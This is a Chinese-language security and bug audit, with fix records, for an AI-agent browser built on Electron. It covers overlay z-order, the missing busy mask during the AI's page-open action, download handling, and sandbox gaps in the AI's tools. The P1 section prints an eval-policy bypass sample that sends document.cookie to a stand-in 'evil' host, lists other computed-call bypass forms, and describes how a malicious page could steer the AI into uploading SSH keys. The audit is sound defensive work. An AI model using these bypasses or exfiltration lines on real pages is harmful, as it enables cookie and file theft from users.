# 内置 AI 浏览器（@picoaide/dsh-browser v4.2）Bug 审计报告

- 日期：2026-09-07
- 对象：`packages/host/browser`（v4.2 单池定案，2026-09-07 13:17 构建 + 14:17 打包产物 `dist/linux-unpacked`）
- 方法：设计文档对照（`docs/planning/2026-09-07-ai-browser-redesign.md`）→ 全量源码走读 → 单测补丁实锤（`vitest`，158 存量 + 5 项探针全绿）→ 真机行为验证（https://picoaide-next.kq0575.cn/ user001，CDP + 真实合成截图 `import -window root` + 真实鼠标点击 `xdotool`）
- 验证环境：审计探针 `temp/audit-browser-mask-probe.mjs`，截图 `temp/audit-browser-mask-shots/`（A1 / B1 / B2 / C1）
- 结论：**2 个用户可见 P0（z-order 遮挡 + open 遮罩/忙态缺失）**、4 个 P1（eval 绕过 / upload 白名单缺失 / store 不随登录切换 / 下载守卫重复挂载）、11 个 P2、4 个 P3。

---

## P0-1　shell 页悬浮 UI 全部被标签视图遮挡（用户实拍确认）

**症状**（用户原话/截图）：打开网页后右下角 AI 指示胶囊不可见 → 没有「我来操作 / 交给 AI」入口；点击 ⋮ 菜单被网页盖住；活动面板、书签/历史/下载查看器同样不可见；空态（无标签）时胶囊能看到（`temp/audit-browser-v4-shots/v4-01-shell-empty.png`），一开标签就消失（用户 Baidu 截图）。

**根因**：浏览器窗口 = BrowserWindow 加载 `browser-shell` 页（工具栏 66px + 全部悬浮 UI），标签页是 `win.contentView` 的 child `WebContentsView`。Electron 中 **child WebContentsView 永远渲染在窗口自身 webContents 之上**，所以标签打开后，内容区（y≥66）内 shell 页的一切固定定位元素（`#ai-indicator`、`#panel`、`#menu`、`#viewer`，`shell-pages.ts`）全部被盖住；只有顶部 66px 工具栏露出来。mask（独立原生视图）不受影响，因此忙时 pill 可见（探针 B1 合成截图证实）。

**为何 E2E 全绿**：`browser-v4-e2e.mjs` 的「AI 指示 + 活动面板」「菜单」「查看器」等 8/11/12 项全部通过 **CDP 对 shell 页 DOM 断言 + `Page.captureScreenshot`**，而 CDP 截图只渲染该 webContents 自身（不含原生子视图）——z-order 类缺陷天然不可见。**E2E 盲区，方法论缺陷**（见「验证盲区」节）。

**修复方向**（P1 设计）：
1. 新建**常驻透明 overlay WebContentsView**（复用 mask 的 `transparent:true` 方案）：承载 AI 指示胶囊 + 活动面板 + ⋮ 菜单 + 查看器，永远位于标签视图之上。
   - 默认 `setBounds` = 右下角胶囊区域（如 260×44）；面板打开时扩为右侧 340px 竖栏；查看器打开时扩为全内容区。
   - 非交互区域点击穿透：`webContents.setIgnoreMouseEvents(true, { forward: true })`，胶囊区域用 `mousemove`（forward）动态切换 `setIgnoreMouseEvents(false)`。
   - 或更简单：把胶囊 + 面板做成**第二个 mask 式视图**，空闲恒显胶囊（小 bounds），点击胶囊后该视图扩为面板。
2. 期间兜底：让 mask 视图兼任「忙态 pill + 点击接管 + 空闲胶囊」也可行（mask 已是 z-top），把 `#ai-indicator`/`#panel` 从 shell 页删除。
3. E2E 增加「真实合成截图断言」（`import -window root` / `xwd`，见探针脚本）与「胶囊可见性」用例。

---

## P0-2　`browser_open` 不经互斥/忙态/用户闸 → 遮罩不显示、人可同时操作（用户实拍确认）

**症状**：AI 打开网页的整个期间没有遮罩、没有「AI 操作中」指示；用户可正常点击页面。用户观察「AI 操作的时候，人也可以操作」即此。

**根因**：`runtime.open()`（`runtime.ts:268-283`）agent 路径只 `pool.reserveTab()` → `createTab()`，**从不经过 `pool.withOperation()`**（`pool.ts:146`）——busy 标记（`busyTool`）与用户闸（`windowControlled`）都在 `withOperation` 里。`shouldMaskShow()` 只认 `pool.isBusy()`（`runtime.ts:384-387`），因此 open 期间遮罩恒不显示；且用户接管期间 AI 仍能开新标签（违反设计 §4.4「新工具排队至 release」）。

**真机验证**（探针 phase A）：open 完成时 `state: tabs=1 busy=false`；open 期间真实点击内容区 → `browser_takeover` 未出现（点击直达页面）；phase B（`browser_wait_for`，busy=true）同一坐标点击 → `browser_takeover=true, controlled=true`——证明遮罩机制本体可用，唯独 open 未接入。

**修复**：agent 路径 `open()` 改为 `await this.pool.withOperation('browser_open', () => this.createTab(url, signal), signal)`（与 navigate/click 一致），reserveTab 一并纳入；用户路径（`user=true`）保持绕过。

---

## P1-1　eval 只读策略绕过：计算属性成员访问（安全边界失效）

**漏洞**：`eval-policy.ts:170-179` `memberName()` 对 `computed: true` 的 MemberExpression 返回 `null` → `WRITE_APIS` 检查被跳过。`window['fetch']('https://evil/?c='+document.cookie)`、`globalThis['eval']('…')`、`document['write']('…')`、`location['assign']('…')`、`localStorage['setItem']('a','b')` 等全部通过 `validateEvalExpression`（补丁测试实锤，6/6 通过；直接成员写法 `fetch(...)`/`window.open(...)` 均被正确拒绝——说明是 computed 分支漏检而非策略缺失）。

**影响**：v4 §7.3-9 承诺「绝对不做任意 JS 执行」被打破；`window['evl']` 类可达任意注入/外带（cookie 读取允许 + fetch 外带组合即完整窃取链；`window['open']` 被 `setWindowOpenHandler` deny 兜底，fetch/eval 无兜底）。

**修复**：computed 属性为 StringLiteral/Literal（字符串）时取其值参与 `WRITE_APIS` 判定；模板字符串/变量计算一律拒绝；补测试锁定 `globalThis['eval']` 等 8 个用例。

## P1-2　`upload_file` 无路径白名单（任意本地文件可被页面读取外带）

**漏洞**：`runtime.uploadFile`（`runtime.ts:1025-1039`）把 `paths` 原样交给 `DOM.setFileInputFiles`，**没有**设计 §6.1 要求的「下载目录白名单（DSH_HOME/downloads + 当前会话工作区）」校验；工具 description 也宣称白名单存在（`tools.ts:444`）。AI（或恶意页面诱导）可上传 `~/.ssh/id_rsa`、桌面应用数据、任意文件到任何带 file input 的站点。

**修复**：上传前把每个路径 `resolve()` + `realpath` 后与「下载目录 + 当前工作区（agent cwd）」白名单比对，非白名单返回 `policy` 错误；白名单来源与 `downloadDir` 同源可配。

## P1-3　浏览器数据 store 目录不随登录切换（多账号数据混用）

**根因**：`index.ts:193-199` 在插件 apply 时一次性计算 `usernameForStore` 并固定 store 目录（`userData/browser-store/<user>`）；而 partition 是 `runtime.setPartition()` 随 `pico/session-changed` 活的。`session-service.ts` 的 `restore()` 是**异步**的（safeStorage 读写），apply 同步执行时 `currentUser()` 常为 `null` → store 落在 `…/browser-store/anonymous`；此后登录/换人只换 partition 不换 store。同机多账号切换 → 书签/历史/下载/标签 ledger 互相可见；重启后登录与未登录状态下的数据也不是同一份。

**修复**：`pico/session-changed` 处理器中同步切换 store（`runtime.setStoreForUser(username)`，重建 BrowserStore 或加 `setDir`/重载）；或 store 位置改为依赖 partition（`session.partition` 派生目录）并随切换重建。ledger 建议按用户分文件即已隔离目录。

## P1-4　下载守卫按标签重复挂载 → 单次下载产生 N 份记录 + 双写

**根因**：同一 partition 的多个标签共享同一个 `session`；`createTab` 对**每个**标签 `session.on('will-download', …)`（`runtime.ts:328-330`）→ N 标签即有 N 个监听器。一次下载触发全部监听器：`record.add` 生成 N 条重复下载记录、N 条 `browser_download` op、N 次 `setSavePath`（同路径，存在 0/1ms 竞态时还可能落到不同 `resolveDownloadPath` 候选名）。补丁测试实锤（2 标签 → 2 监听器 → 2 条记录）。

**修复**：按 `session` 去重（WeakSet<session> 记录已安装守卫，或字典 session→disposer）；`installDownloadGuard` 幂等。

---

## P2 清单（功能/语义，均有代码定位）

| # | 位置 | 问题 | 影响 | 修复 |
|---|---|---|---|---|
| 1 | `runtime.ts:1207-1210` | `wait_for` `url-change` 表达式 = `location.href.length > 0`（恒真）；`network-idle` = `… || true`（恒真） | 工具立即返回 `ok:true`，模型误以为 URL 已变化/网络空闲——SPA 等待类任务核心语义失效 | url-change 注入 startUrl 比较（`location.href !== <startUrl>`）；network-idle 用 `performance.getEntriesByType('resource')` 末项 loadTime 判定；两者补测试 |
| 2 | `pool.restoreLedger` + `runtime.restoreLedger` | 重启后 ledger 只恢复 pool 元数据（url/title/active），无视图、无重建；`shellState` 读 `runtime.tabs` 为空 → 标签不可见但占配额；`destroyTab` 对无视图标签提前 return → `pool.removeTab` 不执行 → **僵尸标签永久无法关闭**；新标签 id 从 1 开始与恢复 id 冲突 | 每次重启后配额虚耗、僵尸标签滞留，设计「views recreated on demand」无实现者 | 恢复时按 url 重建视图（或恢复即置为「已关闭但记录在案」，点开时懒建）；修 destroyTab 先 pool.removeTab；nextTabId 从 max(ledger ids)+1 起 |
| 3 | `runtime.ts:122` + 无 wiring | `downloadDir` 默认 `.picoaide-downloads`（**相对 cwd**）；打包安装目录通常只读/无权限；与设计「DSH_HOME/downloads」不符；`setSavePath` 抛错被 `.catch(() => item.cancel())` 吞掉 → 记录永远 `in-progress` | 下载静默失败 + 挂死记录 | 默认 `join(DSH_HOME, 'downloads')`，desktop 层注入；download 失败路径更新状态为 `rejected` 并记 op |
| 4 | `runtime.ts:468` | `record()` 硬编码 `actor:'ai'` | 用户 shell 操作（开页/导航/关闭/接管）在 op log 全标 AI；历史 actor 正确（user 路径传参），但活动面板时间线失真 | record 增加 actor 参数（navigate 用户路径已带，接线即可） |
| 5 | `runtime.ts:565-568` | `waitUntil:'networkidle'` 只是固定 sleep 800ms | 语义桩；与 wait_for network-idle 同样失真 | 沿用 waitForLoad 的 networkidle 判定（`did-finish-load`+800ms 空闲） |
| 6 | `runtime.ts:752` | eval `frame` 负值静默回落主 frame；越界才报 not-found | 设计 §7.3-9 要求负值也报错；模型传数错误时静默读错 frame | `frame < 0` 直接 `not-found` |
| 7 | `tools.ts:973` + `runtime.clearData` | `clear_data(scope='all-data')` 无用户二次确认（设计 §7.3-4 要求 shell 确认） | AI 一键清空登录态 | 工具面只允许 `group`；`all-data` 走 shell 确认弹窗（需先修 P0-1 让弹窗可见） |
| 8 | `browser_list_tabs`/`close_tab` 描述 | 「YOUR session tabs, others never visible」「closing last tab closes group」是 v4 分组架构残留文案，v4.2 单池实际返回全部标签 | 模型行为误导（以为看不到用户标签）| 更新描述为单池语义 |
| 9 | `runtime.ts:270-275` | `open()` 用户路径 `tryReserveTab` 后 `createTab` 抛错（cdp.attach 失败等）不释放 reserved（agent 路径有 catch 释放） | 配额泄漏，多次失败后用户无法再开标签 | 用户路径加 try/catch `releaseReservation()` |
| 10 | `store.ts:227` | 书签幂等去重：`b.url === entry.url` 比较原始 URL vs 已脱敏 URL（`stripSensitiveUrl` 后） | 带敏感参数 URL 重复收藏（`?token=` 变 `?token=****` 后比对失配） | 去重比较用 `stripSensitiveUrl(entry.url)` |
| 11 | `guard.ts:157-164` | >100MB 拒绝后 `done(cancelled)` 把状态覆盖为 `cancelled`（此前 `rejected` 更新丢失） | 下载列表状态语义错 | done 处理跳过已 `rejected` 记录 |
| 12 | `shell-pages.ts` mask 页 | `TITLE + labelOf(busyTool)` 双文案叠加（「等待页面 · 等待页面」） | 视觉重复 | 去除重复拼接 |

## P3（清理/一致性）

1. **死代码**：`registry.ts`（648 行 GroupRegistry/配额/生命周期）与 `resolve.ts`（126 行）在 v4.2 单池定案后**无任何运行时引用**（仅 `store.ts` 类型引用 `GroupLedger`、`guard.ts` 类型引用 `GroupKey`）；`errors.ts` 的 `foreign-tab/group-not-found/group-archived/group-quota`、`store` 的 `group` 字段随之死语义。建议随 0.1.3 升级窗口删除（含 registry.spec/resolve.spec 或保留测试外壳）。
2. **类型欺骗**：`runtime.saveLedger()` 存的是 `TabLedger`（pool.snapshotLedger）却以 `GroupLedger` 类型写入/读出（`store.saveGroupLedger(… as never)`），能跑纯属两个 shape 恰好同字段 `activeTabId/tabs/savedAt`；正式化 `TabLedger` 类型。
3. **E2E 方法论**：`browser-v4-e2e.mjs` 18 项全部通过，但无一覆盖：真实合成画面（z-order）、遮罩显示/拦截、browser_open 忙态。建议新增「合成截图 + xdotool 点击」断言（探针脚本已实现骨架）。
4. 设计文档 §18 声称 186 用例，实际 158 项（数字漂移，无碍）。

---

## 真机验证记录（2026-09-07，picoaide-next.kq0575.cn / user001）

```
phase A: browser_open seen=true; state tabs=1 busy=false   ← open 无忙态（bug P0-2）
         点击内容区 → takeover 未出现（点击直达页面）
phase B: wait_for busy=true busyTool=browser_wait_for      ← 忙态正常
         合成截图 B1：遮罩 pill「AI 正在操作·等待页面·点击让我接管」可见
         同坐标真实点击 → browser_takeover=true controlled=true  ← 遮罩拦截正常
         释放后 agent 完成收尾（最终 ops: open/navigate/wait_for/takeover/release/close）
```

合成截图（真实窗口，非 CDP）：
- `temp/audit-browser-mask-shots/A1-open-busy-expect-false.png`：open 中无遮罩 pill
- `temp/audit-browser-mask-shots/B1-waitfor-mask-should-show.png`：wait_for 中遮罩 pill 可见
- `temp/audit-browser-mask-shots/B2-after-click-on-mask.png`：点击后接管
- `temp/audit-browser-mask-shots/C1-idle-no-capsule.png`：空闲时右下角无 AI 胶囊（被标签视图遮挡）

## 建议修复批次

- **批次 1（P0/安全，小改动）**：open 接入 withOperation；eval computed 绕过；upload 白名单；下载守卫去重；store 随会话切换。
- **批次 2（P2 功能）**：wait_for 表达式修正；ledger 恢复重建/僵尸清理；downloadDir 绝对化；record actor；frame 负值；clear-data 确认。
- **批次 3（架构，P0-1）**：shell 悬浮 UI（胶囊/面板/菜单/查看器）迁移到常驻透明 overlay WebContentsView（复用 mask 方案），E2E 补真实合成截图断言。

---

## 修复记录（2026-09-07 同日全部实施，用户确认「所有都修复」）

### P0-1　overlay 架构落地（shell 悬浮 UI → 常驻透明 overlay 视图）
- `shell-pages.ts` 重写：`BROWSER_SHELL_HTML` 只保留两行 chrome（TabStrip + Omnibox + 空态）；新增 `BROWSER_OVERLAY_HTML`（AI 指示胶囊 / 活动面板 / ⋮ 菜单 / 查看器 / 忙时遮罩），加载在独立 `transparent:true` 的 **z-top WebContentsView**（复用原 mask 视图）中。
- `runtime.ts`：`shouldMaskShow/applyMask` → `effectiveOverlayMode/overlayBounds/applyOverlay`。**视图 bounds 即布局**——capsule=右下 248×34；panel=右侧 340 竖栏；menu=右上 224×340；viewer/mask=全内容区——overlay 页按 `state.ui.mode` 渲染对应 surface 填充视口；视图外区域点击天然落在页面（无需 setIgnoreMouseEvents 的整面穿透问题）。
- `index.ts`：新增 `POST /api/pico/browser/overlay {mode}` + `/browser-overlay` 路由；`shellState.ui.mode` 下发（overlay 页与 shell 经 SSE 同步）。
- 语义保持：忙时（busy && !controlled）强制 'mask'（scrim + pill「AI 正在操作 · 点击让我接管」全内容区拦截）；接管后回用户所选模式；Esc 关闭浮层/释放。

### P0-2　browser_open 接入互斥/忙态/用户闸
- `runtime.open()` agent 路径 → `pool.withOperation('browser_open', ...)`（busy + 用户闸等待）；用户路径 try/catch 释放 quota 预留。
- 结果：open 期间 `busy=true`、遮罩显示并拦截点击（真机复验见下）。

### P1-1　eval 只读策略加固（eval-policy.ts）
- `memberName` 对字符串字面量 computed（`window['fetch']`）解析属性名参与 WRITE_APIS 判定；非字面量 computed READ 仍允许（`data[key]`、`window['__NEXT_DATA__']`）。
- 新增 `callTargetName`：**调用目标必须可静态证明为固定名**——`window[k]('x')`、`(0, fetch)('x')`、`[fetch][0]('x')`、`(true?fetch:fetch)('x')` 全部拒绝；箭头 IIFE（自包含，体内表达式仍全量校验）放行。
- `globalThis['eval']`/`['Function']` 调用显式拒绝（此前依赖裸 Identifer 检查，computed 绕过）。
- `maskEvalResult` 键名补强：**secret 形状键（token/sessionId/…）的值整体脱敏**——修复「值不含关键字键含关键字不脱敏」缺口。

### P1-2　upload_file 路径白名单
- `runtime.uploadFile` 增加 `allowedDirs`（下载目录 + 会话 cwd，`tools.ts` 从 `exec.agent.session(*.cwd)` 提取）；`realpath` 规范化 + 前缀匹配；越界 → `policy` 错误。无白名单（未配置）→ 直接 policy 拒绝。

### P1-3　store 随会话切换
- `index.ts`：`pico/session-changed` → `closeAll` + `setPartition` + `switchStoreForUser`（新建该用户 BrowserStore → `runtime.setStore` → `restoreLedger`）。store 目录 `userData/browser-store/<user>` 与 partition 同源切换；匿名→登录、多账号切换不再混用书签/历史/下载/ledger。

### P1-4　下载守卫去重（guard.ts）
- `BrowserGuard.guardedSessions`（WeakSet）：同一 session 只装一次 `will-download`；多标签共享分区不再产生重复下载记录/op/路径竞争。
- 顺带修：下载目录不可用 / `setSavePath` 失败 → 记录 `rejected`（不再卡 `in-progress`）；>100MB 拒绝后 done 事件不再把状态覆盖成 `cancelled`。

### P2 全部落地
1. `wait_for` `url-change`（与起始 URL 比较）/ `network-idle`（resource timing 800ms 静默）表达式修正；`navigate` 的 `networkidle` 改用 `waitForLoad` 空闲窗判定（替换 800ms 盲等）。
2. ledger 恢复：Chrome 式会话恢复——恢复元数据即**物化视图并导航**、`nextTabId` 从 max(id)+1 起、`destroyTab` 对无视图标签也执行 `pool.removeTab`（僵尸标签根除）、恢复完成后回设激活标签并落盘。
3. `downloadDir` 默认绝对化：`userData/downloads`（desktop 注入；<DSH_HOME 也无 userData 时回落 cwd 相对）。
4. `record()` actor 接线：用户路径（open/navigate/reload/back/forward/switch/close/closeAll/takeover）记为 `user`；工具路径 `ai`。reload/back/forward 补 op 记录。
5. eval frame 负值 → `not-found`。
6. `clear_data all-data`：工具面直接 `policy` 拒绝（「请在浏览器 ⋮ 菜单确认清除」），shell 菜单 confirm 路径保留。
7. 工具描述更新：`list_tabs`（共享池全量）/ `close_tab` / `open` 单池语义；mask 页 pill 文案去重（「等待页面 · 等待页面」→ 单一拼接）。
8. 书签幂等去重改用脱敏后 URL 比较。
9. `delete` registry.ts（648 行）/ resolve.ts（126 行）/ resolve.spec.ts——v4.2 单池后零运行时引用；`store.ts` 以 `BrowserLedger` 类型正名 ledger（消除 TabLedger 伪装 GroupLedger 的类型欺骗），`guard.ts` groupKey 参数降级为 string。

### 测试与真机验证
- 单测：存量 158 → 删除 resolve.spec(19) → +`tests/audit-fixes.spec.ts` 14 项（eval 绕过锁、open 用户闸/忙态、守卫幂等、waitExpression、ledger 物化+可关、upload 白名单正/反例、actor、store 切换、eval 脱敏）= **153 项全绿**；browser `check`（build+typecheck+test）全绿。
- 真机 E2E（picoaide-next.kq0575.cn / user001，重建 dist/linux-unpacked + `temp/browser-v4.2-e2e.mjs`）：**14/14 通过**，含真实合成截图断言——标签打开后胶囊仍可见（v42-01）、活动面板浮层真实可见（v42-03）、接管态（v42-04）、菜单/查看器（v42-05/06）——CDP 盲区已纳入验证。
- 真机遮罩探针（`temp/audit-browser-mask-probe.mjs`，阶段 A 断言更新为修复后语义：open 期间 `busy=true`、真实点击被拦截接管）重跑中。

---

## 第二轮深挖修复（2026-09-07 同日，用户「感觉 bug 还没修完」触发）

### 上一轮修复的残留/新引入问题（本轮修复）

| # | 问题 | 根因 | 修复 |
|---|---|---|---|
| R2-1 | **启动即弹浏览器窗口**（新引入） | 上轮把 ledger 恢复改为「恢复即物化视图」→ 应用启动/会话切换时历史标签会立即拉起窗口 | 改**惰性恢复**：`restoreLedger` 只登记元数据 + `pendingLedgerTabs`；首次 `ensureWindow`/`showWindow`/`switchTab`/工具解析时 `materializePendingTabs()` 才建视图；单测锁定「恢复后无窗口、无视图，showWindow 才物化」 |
| R2-2 | **会话切换竞态（跨用户泄漏）** | 惰性物化在飞行中用户切换 → 旧用户标签带着 URL 在新分区复活 | `materializeEpoch` 取消闸：`closeAll`/`dispose` 递增 epoch，物化循环逐项校验；切换即作废 |
| R2-3 | ledger 每次操作都同步写盘 | `onAny(() => saveLedger())` 挂在 ops/busy 上，每次动作 `writeFileSync` | 只挂 `tab`/`tab-meta` 事件 |
| R2-4 | 下载状态过滤错乱 | `downloadsGet` 把 `'rejected'/'cancelled'/'in-progress'` cast 成 `'done'` 再过滤 → 按状态查下载永远错 | 类型正名 `DownloadEntry['status']`，原值透传 |
| R2-5 | 下载 URL 无 scheme 守卫 | `downloadUrl` 直接 `webContents.downloadURL`（file:// 等） | 复用 `guard.allowNavigation`（http/https only），`navigation-blocked` |
| R2-6 | 接管/释放 no-op 重复记 op | `setUserControl` 无条件 record，pool 已幂等 | 状态实际变化才 record（测试锁定） |
| R2-7 | eval 副作用 API 名单不全 | `[1].push()`/`sort`、`Object.defineProperty/setPrototypeOf`、`Reflect.set/deleteProperty`、`history.back/forward/go`、`location.replace`、`form.reset/requestSubmit`、`play/pause`、`window.close` 等 21 个漏网 | WRITE_APIS 扩充（`set`/`delete` 一并收口，Map/Set 原地变更同样是页面状态写入）；13 项新拒绝用例 |
| R2-8 | shell 收藏 actor 恒 ai | 书签 POST 调 `addBookmark` 不带 actor | `addBookmark(tab, title, actor)`，shell 传 'user'；下载守卫 actor 同样按创建者传入 |
| R2-9 | 死代码 | `asBrowserError`（注释自相矛盾且零引用）、`runtime.poolTabs()` | 删除 |
| R2-10 | wait_for 无上限 | 模型可传 `timeoutMs=10min` 长时间占用互斥 | 上限 120s |

### 交互体验修复（本轮）

| # | 问题 | 修复 |
|---|---|---|
| R2-U1 | overlay 页获得键盘焦点后 Ctrl+L/T/W/R 全失效 | overlay 页转发 Ctrl+T/W/R；Ctrl+L/Esc 收回 capsule 模式时宿主 `focusPage()` 把焦点还给 shell 工具栏 |
| R2-U2 | ⋮ 菜单打开后点外部不关闭；再点 ⋮ 无反应 | shell 缓存 `state.ui.mode`，⋮ 点击 = 菜单/capsule 切换；菜单 15s 无操作自动收回（bounds 化视图收不到外部点击的兜底） |
| R2-U3 | 菜单视图 340px 高空闲区域死挡页面点击 | 菜单 bounds 降到 244px（内容高度） |
| R2-U4 | 胶囊视图 248px 宽遮挡页面交互 | 缩到 172px（仍容纳「你正在操作 · 交给 AI」） |
| R2-U5 | 查看器打开时下载进度不刷新 | viewer 模式 1.5s 轮询刷新（搜索框聚焦时不抢焦点） |
| R2-U6 | Ctrl+Shift+A 只能开不能关面板 | 按 `ui.mode` 切换 panel/capsule |
| R2-U7 | 面板/菜单/查看器被 Esc/关闭后焦点滞留 overlay | 同 R2-U1（focusPage） |

### 已知边界（记录在案，本轮不做）
- snapshot 不穿透 shadow DOM（上游能力边界）；eval frame>0 走 isolated world（读不到该 frame 页面全局，设计取舍）；`downloadDir` 未在安装包期写入 DSH_HOME（desktop 注入 userData/downloads，无 userData 环境回落 cwd）；op log `failed` 标记暂无 caller（保留 schema）。
- 首次 open 的毫秒级窗口：遮罩视图原生拦截立即生效（页面不可操作），但其页面 JS 的「点击接管」处理器要等 overlay 页加载完（~数百 ms）才注册——阶段 A 探针点击落在此窗口时不记录 takeover（阶段 B 已确定性证明拦截+接管链路）。可接受；如需消除可预载 overlay 页。
- 验证：browser check（build+typecheck+**157 单测**）全绿；真机 E2E 14/14（round-2 构建）；遮罩探针全阶段通过。

---

## 第三轮：交互体验深挖（2026-09-07，用户「继续深挖交互体验」）

### 交互问题 → 修复（9 项，全部落地并真机断言）

| # | 问题 | 修复 |
|---|---|---|
| R3-1 | 标签页 favicon 是死灰占位块，真实 favicon 从未加载 | 监听 `page-favicon-updated` → `BrowserTabState.favicon` → shell 渲染 `<img class=favicon>`（src 用 DOM 属性赋值防注入）；E2E 断言真实 favicon 出现 |
| R3-2 | 后退/前进/刷新按钮从不置灰（不可用时点了没反应） | `webContents.navigationHistory.canGoBack/canGoForward`（Electron 43 新 API）进 tab 状态；shell 按可用性禁用按钮；E2E 断言无历史时 back 禁用 |
| R3-3 | 书签/历史查看器条目是死文本 | 行可点击：关闭 viewer → `navigate` 打开该 URL（E2E 断言点击后地址栏更新） |
| R3-4 | 下载条目无法打开文件 | 新增 `POST /api/pico/browser/downloads/open {id}` → `adapter.openPath`（`shell.openPath`）；「打开」按钮 + 成功/失败 toast；runtime 单测覆盖 |
| R3-5 | 无 Ctrl+Tab 切换标签 / 无中键关闭 | shell + overlay 转发 Ctrl+Tab（循环切换）；标签 `auxclick` button===1 关闭；E2E 两项断言 |
| R3-6 | 导航失败/配额超限等错误零反馈 | shell/overlay 各加 toast（错误 3.2s 自动消失，aria-live）；`postErr` 统一「错误→toast+refresh」；E2E 断言 `file://` 被拒后 toast 出现 |
| R3-7 | 无 `prefers-reduced-motion` 降级；状态点无 aria-live | 两个页面加 `@media (prefers-reduced-motion: reduce)`（呼吸动画→静态）；胶囊 label `aria-live="polite"` |
| R3-8 | 活动时间线只有时分秒，跨天条目无法分辨 | `fmtTime` 非当日加 `M/D` 前缀 |
| R3-9 | 窗口标题恒「PicoAide 浏览器」 | `updateTabState`/`switchTab` 时 `refreshWindowTitle`：活动标签页标题 →「标题 — PicoAide 浏览器」；单测锁定 |

### 验证
- browser check 全绿（**160 单测**：新增 favicon/history 标志暴露、窗口标题跟随、openDownloadPath 正/反例）
- 真机 E2E 扩展至 **20 项全绿**（新增：真实 favicon、按钮置灰、Ctrl+Tab、中键关闭、历史行导航、被拒导航 toast）
- 一个测试方法教训：地址栏对无 `://` 输入自动加 https:// 前缀，`javascript:alert(1)` 会变 `https://javascript:…` 走 Chromium 错误页而非守卫拒绝——toast 断言用例须用 `file://`（含 `://` 不加前缀、必被守卫拒绝）
